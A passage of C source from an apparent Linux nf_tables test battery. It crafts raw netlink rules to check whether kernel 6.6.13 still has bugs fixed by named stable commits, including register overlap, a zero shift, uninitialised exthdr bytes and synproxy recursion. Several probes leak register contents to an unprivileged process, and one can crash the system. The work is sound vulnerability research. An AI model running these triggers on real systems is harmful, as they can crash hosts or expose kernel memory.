	snprintf(out, n, "setup=OK|live=%s|expired=%s|op=%s|after=%s",
		 deliv(sr1), deliv(sr2),
		 errs < 0 ? "SENDFAIL" :
		 (errs == 0 ? "OK" : (e1 ? "E" : "ERR")),
		 deliv(sr3));
	if (errs > 0 && e1)
		snprintf(out + strlen(out), n - strlen(out), "|op_errno=%d", -e1);
	return 0;
}

static int sc_cto_reinsert(char *out, size_t n) { return sc_cto(0, out, n); }
static int sc_cto_delete(char *out, size_t n)   { return sc_cto(1, out, n); }
static int sc_cto_live(char *out, size_t n)     { return sc_cto(2, out, n); }
static int sc_cto_key(char *out, size_t n)      { return sc_cto(3, out, n); }

/* ---- door 3 scenarios ---- */
static int sc_concat(uint32_t klen, uint32_t f0, uint32_t f1, char *out, size_t n)
{
	uint32_t fields[2];
	int errs;

	fields[0] = f0;
	fields[1] = f1;
	nops = 0;
	nrecs = 0;
	op_newtable("dt");
	op_newset_concat("dt", "s", klen, fields, 2);
	errs = nf_flush();
	if (errs < 0) {
		snprintf(out, n, "setup=SENDFAIL_%d", errs);
		return -1;
	}
	snprintf(out, n, "setup=%s|errno=%d|extack=%.80s",
		 errs == 0 ? "OK" : "ERR", g_err ? -g_err : 0,
		 g_extack[0] ? g_extack : "none");
	return 0;
}

static int sc_concat_door(char *out, size_t n) { return sc_concat(10, 5, 4, out, n); }
static int sc_concat_ok(char *out, size_t n)   { return sc_concat(12, 5, 4, out, n); }
static int sc_concat_bad(char *out, size_t n)  { return sc_concat(10, 4, 4, out, n); }

static void run_crash(const char *which)
{
	/* controls first: the door at the end can take the boot down */
	if (!strcmp(which, "crash") || !strcmp(which, "crashctl")) {
		run_new("crash.ctl_inrange", sc_crash_inrange, 30);
		run_new("crash.ctl_nocsum", sc_crash_nocsum, 30);
	}
	if (!strcmp(which, "crash"))
		run_new("crash.door", sc_crash_door, 30);
}

static void run_cto(void)
{
	run_new("cto.ctl_key", sc_cto_key, 30);
	run_new("cto.ctl_live", sc_cto_live, 30);
	run_new("cto.delete", sc_cto_delete, 30);
	run_new("cto.reinsert", sc_cto_reinsert, 30);
}

static void run_concat(void)
{
	run_new("concat.ctl_klen12", sc_concat_ok, 20);
	run_new("concat.ctl_klen10_f44", sc_concat_bad, 20);
	run_new("concat.door", sc_concat_door, 20);
}

/* =====================================================================
 * TURN 535 -- bucket B: bitwise and byteorder, messages the battery could
 *             not send at all until now.
 *
 * Turn 534 ended by saying the battery's blindness was a vocabulary, not a
 * reachability question, so the next map has to be a list of *messages* it
 * cannot send.  Bucket B -- commits whose code is compiled into this kernel
 * but which no message ever reached -- starts with two commits that live in
 * nft_bitwise/nft_byteorder:
 *
 *   b80ef316e978  "fix dst corruption in same register operation"   (6.6.143)
 *        nft_bitwise_eval_lshift/rshift write dst[i] and then read src[i] to
 *        compute the carry.  With sreg == dreg that is the same memory, so the
 *        carry is taken from the word that was just written.  Partial overlap
 *        (sreg and dreg windows intersect but are not equal) is accepted by
 *        6.6.13 in bitwise *and* byteorder; the fix rejects both.
 *   bffef0acec9c  "reject zero shift in nft_bitwise"               (6.6.140)
 *        shift 0 turns `BITS_PER_TYPE(u32) - shift` into a 32-bit shift, which
 *        is undefined behaviour; 6.6.13 accepts such a rule and computes
 *        whatever the compiler emitted for it.
 *
 * The readout is the one turn 533 built: `payload set` copies 16 bytes of a
 * data register into the UDP payload and a process that dropped to uid 65534
 * reads them back.  The only new part is the expression between the immediate
 * and the payload write -- and that is the whole point of the turn: the same
 * binary, the same readout, a different *message*.
 *
 * Every attribute number was read from
 * include/uapi/linux/netfilter/nf_tables.h of the 6.6.13 tree, not remembered:
 *   NFTA_BITWISE_SREG 1 DREG 2 LEN 3 MASK 4 XOR 5 OP 6 DATA 7
 *   NFTA_BYTEORDER_SREG 1 DREG 2 OP 3 LEN 4 SIZE 5
 *   NFT_BITWISE_BOOL 0 LSHIFT 1 RSHIFT 2 ; NFT_BYTEORDER_NTOH 0 HTON 1
 *   NFT_REG32_00 8, NFT_REG32_01 9, NFT_REG32_08 16
 * The shift operand travels as a 4-byte NFTA_DATA_VALUE that the kernel reads
 * as a native u32 (`priv->data.data[0]`), so shift 8 is the bytes 08 00 00 00.
 * That is a claim, not a fact: scenario bw.l.be sends the other byte order and
 * must be refused on every kernel.
 * ===================================================================== */

#define BW_SREG 1
#define BW_DREG 2
#define BW_LEN  3
#define BW_OP   6
#define BW_DATA 7
#define BO_SREG 1
#define BO_DREG 2
#define BO_OP   3
#define BO_LEN  4
#define BO_SIZE 5
#define BW_LSHIFT 1
#define BW_RSHIFT 2
#define BO_NTOH 0
#define BO_HTON 1
#define NFT_REG32_01_ 9

/* 16 bytes every scenario starts from: two words that make the carry visible
 * (0x11223344 and 0x55667788 in memory), then zeros */
static const unsigned char g_bw_imm[16] = {
	0x44, 0x33, 0x22, 0x11, 0x88, 0x77, 0x66, 0x55,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};
static const unsigned char sh8[4]   = { 0x08, 0x00, 0x00, 0x00 };
static const unsigned char sh0[4]   = { 0x00, 0x00, 0x00, 0x00 };
static const unsigned char sh32[4]  = { 0x20, 0x00, 0x00, 0x00 };
static const unsigned char sh8be[4] = { 0x00, 0x00, 0x00, 0x08 };
static const unsigned char g_bw_zero[16] = { 0 };

#define B_NORULE        20
#define B_CONST         21
#define B_L_DISTINCT    22
#define B_L_SAME        23
#define B_R_DISTINCT    24
#define B_R_SAME        25
#define B_L_ZERO        26
#define B_R_ZERO        27
#define B_L_PARTIAL     28
#define B_L_SHIFT32     29
#define B_L_BE          30
#define B_BO_DISTINCT   31
#define B_BO_SAME       32
#define B_BO_PARTIAL    33
#define B_BO_SIZE8_SAME 34
#define B_BO_HTON_SAME  35
#define B_CTL_REGINIT   36
#define B_CTL_UNINIT    37
#define B_L_NONOVERLAP  38
#define B_BO_NONOVERLAP 39

static void bw_expr(struct nlmsghdr *nlh, uint32_t op, uint32_t sreg,
		    uint32_t dreg, uint32_t len, const unsigned char *dat4)
{
	struct nlattr *e, *d, *v;

	e = nest_start(nlh, NFTA_LIST_ELEM, "bw.elem");
	put_str(nlh, NFTA_EXPR_NAME, "bitwise", "bw.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "bw.data");
	put_be32(nlh, BW_SREG, sreg, "bw.sreg");
	put_be32(nlh, BW_DREG, dreg, "bw.dreg");
	put_be32(nlh, BW_LEN, len, "bw.len");
	put_be32(nlh, BW_OP, op, "bw.op");
	v = nest_start(nlh, BW_DATA, "bw.datanest");
	attr_put(nlh, NFTA_DATA_VALUE, dat4, 4, "bw.shift");
	nest_end(nlh, v);
	nest_end(nlh, d);
	nest_end(nlh, e);
}

static void bo_expr(struct nlmsghdr *nlh, uint32_t op, uint32_t sreg,
		    uint32_t dreg, uint32_t len, uint32_t size)
{
	struct nlattr *e, *d;

	e = nest_start(nlh, NFTA_LIST_ELEM, "bo.elem");
	put_str(nlh, NFTA_EXPR_NAME, "byteorder", "bo.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "bo.data");
	put_be32(nlh, BO_SREG, sreg, "bo.sreg");
	put_be32(nlh, BO_DREG, dreg, "bo.dreg");
	put_be32(nlh, BO_OP, op, "bo.op");
	put_be32(nlh, BO_LEN, len, "bo.len");
	put_be32(nlh, BO_SIZE, size, "bo.size");
	nest_end(nlh, d);
	nest_end(nlh, e);
}

/* The rule shapes.  out_reg is the register the 16-byte payload write reads,
 * i.e. the one whose content the reader sees. */
static struct nlmsghdr *op_newrule_bw(const char *table, const char *chain,
				      int prog)
{
	struct nlmsghdr *nlh;
	struct nlattr *exprs;
	uint32_t out_reg = NFT_REG32_00;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_RULE_TABLE, table, "b.rule.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "b.rule.chain");
	exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "b.rule.exprs");

	switch (prog) {
	case B_CONST:
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		break;
	case B_L_DISTINCT:
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		bw_expr(nlh, BW_LSHIFT, NFT_REG32_00, NFT_REG32_08, 16, sh8);
		out_reg = NFT_REG32_08;
		break;
	case B_L_SAME:
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		bw_expr(nlh, BW_LSHIFT, NFT_REG32_00, NFT_REG32_00, 16, sh8);
		break;
	case B_R_DISTINCT:
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		bw_expr(nlh, BW_RSHIFT, NFT_REG32_00, NFT_REG32_08, 16, sh8);
		out_reg = NFT_REG32_08;
		break;
	case B_R_SAME:
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		bw_expr(nlh, BW_RSHIFT, NFT_REG32_00, NFT_REG32_00, 16, sh8);
		break;
	case B_L_ZERO:
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		bw_expr(nlh, BW_LSHIFT, NFT_REG32_00, NFT_REG32_08, 16, sh0);
		out_reg = NFT_REG32_08;
		break;
	case B_R_ZERO:
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		bw_expr(nlh, BW_RSHIFT, NFT_REG32_00, NFT_REG32_08, 16, sh0);
		out_reg = NFT_REG32_08;
		break;
	case B_L_PARTIAL:
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		bw_expr(nlh, BW_LSHIFT, NFT_REG32_00, NFT_REG32_01_, 16, sh8);
		out_reg = NFT_REG32_01_;
		break;
	case B_L_SHIFT32:
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		bw_expr(nlh, BW_LSHIFT, NFT_REG32_00, NFT_REG32_08, 16, sh32);
		out_reg = NFT_REG32_08;
		break;
	case B_L_BE:
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		bw_expr(nlh, BW_LSHIFT, NFT_REG32_00, NFT_REG32_08, 16, sh8be);
		out_reg = NFT_REG32_08;
		break;
	case B_BO_DISTINCT:
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		/* the read window is 16 bytes but a byteorder of len 8 writes only
		 * half of it; on kernels with the register-initialisation validator
		 * (1816619b2fe8, absent in 6.6.13) an uninitialised word in the read
		 * window refuses the rule with -ENODATA for a reason that has nothing
		 * to do with this door.  Zeroing the window first removes that
		 * confound -- and B_CTL_REGINIT is the control that proves the
		 * zeroing path itself is legal on every kernel. */
		exfil_imm_value(nlh, NFT_REG32_08, g_bw_zero, 16);
		bo_expr(nlh, BO_NTOH, NFT_REG32_00, NFT_REG32_08, 8, 4);
		out_reg = NFT_REG32_08;
		break;
	case B_BO_SAME:
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		bo_expr(nlh, BO_NTOH, NFT_REG32_00, NFT_REG32_00, 8, 4);
		break;
	case B_BO_PARTIAL:
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		exfil_imm_value(nlh, NFT_REG32_01_, g_bw_zero, 16);   /* see B_BO_DISTINCT */
		bo_expr(nlh, BO_NTOH, NFT_REG32_00, NFT_REG32_01_, 8, 4);
		out_reg = NFT_REG32_01_;
		break;
	case B_BO_SIZE8_SAME:
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		bo_expr(nlh, BO_NTOH, NFT_REG32_00, NFT_REG32_00, 8, 8);
		break;
	case B_BO_HTON_SAME:
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		bo_expr(nlh, BO_HTON, NFT_REG32_00, NFT_REG32_00, 16, 4);
		break;
	case B_L_NONOVERLAP:
		/* partner of B_L_PARTIAL, differing in exactly one field: the
		 * destination window (word 5 vs word 6).  No state is shared between
		 * source and destination, so the value is the plain shifted word --
		 * which is what makes "EINVAL vs value" a statement about overlap. */
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		bw_expr(nlh, BW_LSHIFT, NFT_REG32_00, 12, 16, sh8);
		out_reg = 12;
		break;
	case B_BO_NONOVERLAP:
		/* partner of B_BO_PARTIAL, differing in exactly one field: dreg word 6
		 * instead of word 5.  Same zeroed read window, same length. */
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		exfil_imm_value(nlh, 10, g_bw_zero, 16);
		bo_expr(nlh, BO_NTOH, NFT_REG32_00, 10, 8, 4);
		out_reg = 10;
		break;
	case B_CTL_REGINIT:
		/* control for the confound fix: same immediates as B_BO_DISTINCT,
		 * no byteorder at all -> the read window is all zeros on every kernel */
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		exfil_imm_value(nlh, NFT_REG32_08, g_bw_zero, 16);
		out_reg = NFT_REG32_08;
		break;
	case B_CTL_UNINIT:
		/* control that measures the *other* kernel generation's behaviour:
		 * a 16-byte read from a register nothing wrote.  6.6.13 accepts it
		 * (and copies stale register content); kernels with 1816619b2fe8
		 * refuse the rule with -ENODATA.  This is also the reason the first
		 * version of B_BO_DISTINCT read as ERR61 on those kernels. */
		exfil_imm_value(nlh, NFT_REG32_00, g_bw_imm, 16);
		out_reg = NFT_REG32_08;
		break;
	default:
		return NULL;
	}

	reg_payload_set(nlh, out_reg, NFT_PAYLOAD_TRANSPORT_HEADER, 8, 16);
	exfil_imm_verdict(nlh, NF_ACCEPT);
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

static void bw_one(const char *id, int prog)
{
	struct scen sc;

	g_cmp_on = 0;
	g_reg_mode = 1;
	memset(&sc, 0, sizeof(sc));
	sc.id = id;
	sc.prog = prog;
	sc.mut_rec = -1;
	sc.mut_kind = MUT_NONE;
	sc.verdict = NF_ACCEPT;
	run_scenario(&sc);
}

/* Partners.  Every door has one that differs in exactly one field:
 *   l.distinct vs l.same      -> the destination register (the whole door)
 *   l.same     vs r.same      -> the direction of the shift
 *   l.same     vs l.zero      -> shift 8 vs shift 0
 *   l.zero     vs l.shift32   -> a shift the OLD check already refused
 *   l.zero     vs l.be        -> the byte order of the shift operand
 *   bo.same    vs bo.partial  -> an equal window vs an intersecting one
 *   bo.distinct vs bo.same    -> whether sreg == dreg changes the answer
 */
static void run_bitw(void)
{
	bw_one("bw.ctl.norule", B_NORULE);
	bw_one("bw.ctl.const", B_CONST);
	bw_one("bw.l.distinct", B_L_DISTINCT);
	bw_one("bw.l.same", B_L_SAME);
	bw_one("bw.r.distinct", B_R_DISTINCT);
	bw_one("bw.r.same", B_R_SAME);
	bw_one("bw.l.zero", B_L_ZERO);
	bw_one("bw.r.zero", B_R_ZERO);
	bw_one("bw.l.partial", B_L_PARTIAL);
	bw_one("bw.l.shift32", B_L_SHIFT32);
	bw_one("bw.l.be", B_L_BE);
	bw_one("bw.bo.distinct", B_BO_DISTINCT);
	bw_one("bw.bo.same", B_BO_SAME);
	bw_one("bw.bo.partial", B_BO_PARTIAL);
	bw_one("bw.bo.size8.same", B_BO_SIZE8_SAME);
	bw_one("bw.bo.hton.same", B_BO_HTON_SAME);
	bw_one("bw.ctl.reginit", B_CTL_REGINIT);
	bw_one("bw.ctl.uninit", B_CTL_UNINIT);
	bw_one("bw.l.nonoverlap", B_L_NONOVERLAP);
	bw_one("bw.bo.nonoverlap", B_BO_NONOVERLAP);
}

/* =====================================================================
 * TURN 536 -- bucket B, second batch: exthdr / family / objref, and the
 *             two reasons the battery could not see them.
 *
 * Turn 535 ended with a promise: "the next messages from bucket B are meta,
 * counter, dynset, range, rt, exthdr".  Reading the code first changed the
 * list, because two of the three doors chosen here turned out to be
 * unreachable for a reason that is neither the commit nor the message:
 *
 *   (a) the *family* the message is sent in.  c1be9784f3ad adds
 *       `return -EOPNOTSUPP` when ctx->family is not ipv4/ipv6/inet to seven
 *       expressions.  The only way to observe that clause is a table in a
 *       family outside that set -- netdev, arp, bridge.  CONFIG_NF_TABLES_NETDEV
 *       and CONFIG_NF_TABLES_ARP are both OFF in the reference config, so the
 *       battery could not even *create* such a table: the door was not the
 *       message, it was the kernel image.
 *   (b) the *object type*.  0028e0134c64 validates objref/objrefmap, and the
 *       only type it validates is SYNPROXY, which lives in nft_synproxy.o --
 *       CONFIG_NFT_SYNPROXY, also OFF.  Without that symbol no userspace can
 *       create the object the door is about.
 *
 * Hence config C (logs/kernel-6.6.13-f13C.config) = reference + exactly those
 * three symbols, and every kernel of this turn is built from it.
 *
 * The three doors, each with a partner differing in one field:
 *
 *   EH   cd513e43b4b2  nft_exthdr: with NFT_EXTHDR_F_PRESENT the eval path
 *        writes 1 byte (nft_reg_store8) or 4 (*dest = 0), but init marks
 *        priv->len bytes as initialized.  A rule that asks for len 16 and then
 *        reads 16 bytes out through `payload set` is therefore *legal* while
 *        only the first four were ever written.  The commit says the leftover
 *        is "uninitialized stack data from nft_regs".  That sentence is
 *        testable, and this tree has 4c905f6740a3 ("initialize registers in
 *        nft_do_chain()", 2022) which zeroes the whole register file: the
 *        prediction below is 12 zero bytes, i.e. the hazard described by the
 *        commit is *latent* here.  The sixth kernel of the turn (k13n) removes
 *        exactly that one line to show the difference is the zero-init and not
 *        my scaffolding.
 *   FAM  c1be9784f3ad  nft_rt: validate() checks hooks only for NFT_RT_TCPMSS;
 *        NEXTHOP4/6, CLASSID and XFRM return 0 before any hook *or* family
 *        check.  In a netdev ingress chain 6.6.13 accepts `rt nexthop4`; the
 *        fix refuses it with -EOPNOTSUPP.
 *   OBJ  0028e0134c64  nft_objref: no validate at all on this base, so a
 *        synproxy object may be referenced from an OUTPUT chain, where its
 *        eval re-enters the same hook (synproxy_send_client_synack ->
 *        ip_local_out -> OUTPUT) with no recursion guard.
 *
 * Every attribute number below was read from include/uapi/linux/netfilter/
 * nf_tables.h of the 6.6.13 tree, not remembered:
 *   NFTA_EXTHDR_DREG 1 TYPE 2 OFFSET 3 LEN 4 FLAGS 5 OP 6 SREG 7
 *   NFT_EXTHDR_OP_TCPOPT 1 ; NFT_EXTHDR_F_PRESENT 1
 *   NFTA_RT_DREG 1 KEY 2 ; NFT_RT_CLASSID 0 NEXTHOP4 1 NEXTHOP6 2 TCPMSS 3 XFRM 4
 *   NFTA_HOOK_HOOKNUM 1 PRIORITY 2 DEV 3
 *   NFTA_OBJREF_IMM_TYPE 1 IMM_NAME 2 SET_SREG 3 SET_NAME 4 SET_ID 5
 *   NFTA_OBJ_TABLE 1 NAME 2 TYPE 3 DATA 4
 *   NFT_OBJECT_COUNTER 1, NFT_OBJECT_SYNPROXY 10
 *   NFTA_META_DREG 1 KEY 2 ; NFT_META_MARK 3
 *   NFPROTO_INET 1 IPV4 2 ARP 3 NETDEV 5 ; NF_INET_LOCAL_IN 1 LOCAL_OUT 3
 *   NF_NETDEV_INGRESS 0 ; NF_ARP_IN 0
 * ===================================================================== */

#define F13_EXTHDR_DREG   1
#define F13_EXTHDR_TYPE   2
#define F13_EXTHDR_OFFSET 3
#define F13_EXTHDR_LEN    4
#define F13_EXTHDR_FLAGS  5
#define F13_EXTHDR_OP     6
#define F13_EXTHDR_OP_TCPOPT 1
#define F13_EXTHDR_F_PRESENT 1

#define F13_RT_DREG 1
#define F13_RT_KEY  2
#define F13_RT_NEXTHOP4 1
#define F13_RT_TCPMSS   3
#define F13_RT_XFRM     4

#define F13_HOOK_DEV 3

#define F13_OBJREF_IMM_TYPE 1
#define F13_OBJREF_IMM_NAME 2
#define F13_OBJ_TABLE 1
#define F13_OBJ_NAME  2
#define F13_OBJ_TYPE  3
#define F13_OBJ_DATA  4

#define F13_OBJ_COUNTER  1
#define F13_OBJ_SYNPROXY 10

#define F13_ARP    3
#define F13_NETDEV 5
#define F13_NF_NETDEV_INGRESS 0
#define F13_NF_ARP_IN 0

#define F13_META_DREG 1
#define F13_META_KEY  2
#define F13_META_MARK 3

/* 16 bytes the controls start from; visible in every byte so that a write is
 * distinguishable from a leftover, and different from the probe pattern */
static const unsigned char g_f13_const[16] = {
	0xa1, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7, 0xa8,
	0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf, 0xb0,
};

#define P_FAM_NORULE      60
#define P_FAM_META_ND     61
#define P_FAM_RT_IN4      62
#define P_FAM_RT_MSS_ND   63
#define P_FAM_RT_ND       64
#define P_FAM_RT_ARP      65
#define P_FAM_RT_XFRM_ND  66

#define P_EH_CONST        70
#define P_EH_LEN1         71
#define P_EH_LEN4         72
#define P_EH_LEN16        73
#define P_EH_LEN16I       74
#define P_EH_NOPRESENT    75

#define P_OBJ_COUNTER_OUT 80
#define P_OBJ_SYN_IN      81
#define P_OBJ_SYN_OUT     82

/* ---- table / chain / object builders that take a family ---- */

static struct nlmsghdr *op_newtable_fam(uint8_t fam, const char *table)
{
	struct nlmsghdr *nlh;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL, fam);
	put_str(nlh, NFTA_TABLE_NAME, table, "f.table.name");
	nops++;
	return nlh;
}

static struct nlmsghdr *op_newchain_fam(uint8_t fam, const char *table,
					const char *chain, int hooknum,
					int priority, uint32_t policy,
					const char *dev)
{
	struct nlmsghdr *nlh;
	struct nlattr *hook;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL, fam);
	put_str(nlh, NFTA_CHAIN_TABLE, table, "f.chain.table");
	put_str(nlh, NFTA_CHAIN_NAME, chain, "f.chain.name");
	put_str(nlh, NFTA_CHAIN_TYPE, "filter", "f.chain.type");
	put_be32(nlh, NFTA_CHAIN_POLICY, policy, "f.chain.policy");
	hook = nest_start(nlh, NFTA_CHAIN_HOOK, "f.chain.hook");
	put_be32(nlh, NFTA_HOOK_HOOKNUM, (uint32_t)hooknum, "f.chain.hooknum");
	put_be32(nlh, NFTA_HOOK_PRIORITY, (uint32_t)priority, "f.chain.priority");
	if (dev)
		put_str(nlh, F13_HOOK_DEV, dev, "f.chain.hook.dev");
	nest_end(nlh, hook);
	nops++;
	return nlh;
}

static struct nlmsghdr *op_newobj(uint8_t fam, const char *table,
				  const char *name, uint32_t type)
{
	struct nlmsghdr *nlh;
	struct nlattr *data;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWOBJ,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL, fam);
	put_str(nlh, F13_OBJ_TABLE, table, "f.obj.table");
	put_str(nlh, F13_OBJ_NAME, name, "f.obj.name");
	put_be32(nlh, F13_OBJ_TYPE, type, "f.obj.type");
	data = nest_start(nlh, F13_OBJ_DATA, "f.obj.data");
	nest_end(nlh, data);
	nops++;
	return nlh;
}

/* ---- the three new expressions ---- */

static void f13_exthdr_expr(struct nlmsghdr *nlh, uint32_t dreg, uint32_t type,
			    uint32_t off, uint32_t len, int present)
{
	struct nlattr *e, *d;
	unsigned char ty = (unsigned char)type;

	e = nest_start(nlh, NFTA_LIST_ELEM, "eh.elem");
	put_str(nlh, NFTA_EXPR_NAME, "exthdr", "eh.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "eh.data");
	put_be32(nlh, F13_EXTHDR_DREG, dreg, "eh.dreg");
	attr_put(nlh, F13_EXTHDR_TYPE, &ty, 1, "eh.type");
	put_be32(nlh, F13_EXTHDR_OFFSET, off, "eh.offset");
	put_be32(nlh, F13_EXTHDR_LEN, len, "eh.len");
	if (present)
		put_be32(nlh, F13_EXTHDR_FLAGS, F13_EXTHDR_F_PRESENT, "eh.flags");
	put_be32(nlh, F13_EXTHDR_OP, F13_EXTHDR_OP_TCPOPT, "eh.op");
	nest_end(nlh, d);
	nest_end(nlh, e);
}

static void f13_rt_expr(struct nlmsghdr *nlh, uint32_t dreg, uint32_t key)
{
	struct nlattr *e, *d;

	e = nest_start(nlh, NFTA_LIST_ELEM, "rt.elem");
	put_str(nlh, NFTA_EXPR_NAME, "rt", "rt.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "rt.data");
	put_be32(nlh, F13_RT_DREG, dreg, "rt.dreg");
	put_be32(nlh, F13_RT_KEY, key, "rt.key");
	nest_end(nlh, d);
	nest_end(nlh, e);
}

static void f13_meta_expr(struct nlmsghdr *nlh, uint32_t dreg, uint32_t key)
{
	struct nlattr *e, *d;

	e = nest_start(nlh, NFTA_LIST_ELEM, "mt.elem");
	put_str(nlh, NFTA_EXPR_NAME, "meta", "mt.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "mt.data");
	put_be32(nlh, F13_META_DREG, dreg, "mt.dreg");
	put_be32(nlh, F13_META_KEY, key, "mt.key");
	nest_end(nlh, d);
	nest_end(nlh, e);
}

static void f13_objref_expr(struct nlmsghdr *nlh, const char *name, uint32_t type)
{
	struct nlattr *e, *d;

	e = nest_start(nlh, NFTA_LIST_ELEM, "ob.elem");
	put_str(nlh, NFTA_EXPR_NAME, "objref", "ob.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "ob.data");
	put_str(nlh, F13_OBJREF_IMM_NAME, name, "ob.imm.name");
	put_be32(nlh, F13_OBJREF_IMM_TYPE, type, "ob.imm.type");
	nest_end(nlh, d);
	nest_end(nlh, e);
}

/* ---- one rule builder for all fourteen programs of this turn ---- */

static struct nlmsghdr *op_newrule_f13(uint8_t fam, const char *table,
				       const char *chain, int prog)
{
	struct nlmsghdr *nlh;
	struct nlattr *exprs;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND, fam);
	put_str(nlh, NFTA_RULE_TABLE, table, "f.rule.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "f.rule.chain");
	exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "f.rule.exprs");

	switch (prog) {
	/* --- family door: constant, then the expression, then 16 bytes out --- */
	case P_FAM_META_ND:
		exfil_imm_value(nlh, NFT_REG32_00, g_f13_const, 16);
		f13_meta_expr(nlh, NFT_REG32_00, F13_META_MARK);
		reg_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER, 8, 16);
		break;
	case P_FAM_RT_IN4:
	case P_FAM_RT_ND:
	case P_FAM_RT_ARP:
		exfil_imm_value(nlh, NFT_REG32_00, g_f13_const, 16);
		f13_rt_expr(nlh, NFT_REG32_00, F13_RT_NEXTHOP4);
		reg_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER, 8, 16);
		break;
	case P_FAM_RT_MSS_ND:
		exfil_imm_value(nlh, NFT_REG32_00, g_f13_const, 16);
		f13_rt_expr(nlh, NFT_REG32_00, F13_RT_TCPMSS);
		reg_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER, 8, 16);
		break;
	case P_FAM_RT_XFRM_ND:
		exfil_imm_value(nlh, NFT_REG32_00, g_f13_const, 16);
		f13_rt_expr(nlh, NFT_REG32_00, F13_RT_XFRM);
		reg_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER, 8, 16);
		break;

	/* --- exthdr door: no constant before the expression, so the 12 bytes
	 *     the expression did not write are whatever the register file held --- */
	case P_EH_CONST:
		exfil_imm_value(nlh, NFT_REG32_00, g_f13_const, 16);
		reg_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER, 8, 16);
		break;
	case P_EH_LEN1:
		f13_exthdr_expr(nlh, NFT_REG32_00, 254, 0, 1, 1);
		reg_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER, 8, 1);
		break;
	case P_EH_LEN4:
		f13_exthdr_expr(nlh, NFT_REG32_00, 254, 0, 4, 1);
		reg_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER, 8, 4);
		break;
	case P_EH_LEN16:
		f13_exthdr_expr(nlh, NFT_REG32_00, 254, 0, 16, 1);
		reg_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER, 8, 16);
		break;
	case P_EH_LEN16I:
		exfil_imm_value(nlh, NFT_REG32_00, g_f13_const, 16);
		f13_exthdr_expr(nlh, NFT_REG32_00, 254, 0, 16, 1);
		reg_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER, 8, 16);
		break;
	case P_EH_NOPRESENT:
		f13_exthdr_expr(nlh, NFT_REG32_00, 254, 0, 16, 0);
		reg_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER, 8, 16);
		break;

	/* --- objref door: the expression alone; the object is the difference --- */
	case P_OBJ_COUNTER_OUT:
		f13_objref_expr(nlh, "oc", F13_OBJ_COUNTER);
		break;
	case P_OBJ_SYN_IN:
	case P_OBJ_SYN_OUT:
		f13_objref_expr(nlh, "os", F13_OBJ_SYNPROXY);
		break;
	}
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

/* ---- one scenario runner: setup verdict first, then the probe ---- */

struct f13_res {
	int errs;
	int e1;
	int sr;
	struct reg_res r;
};

static void f13_report(const char *mode_note, struct f13_res *f, char *out, size_t n)
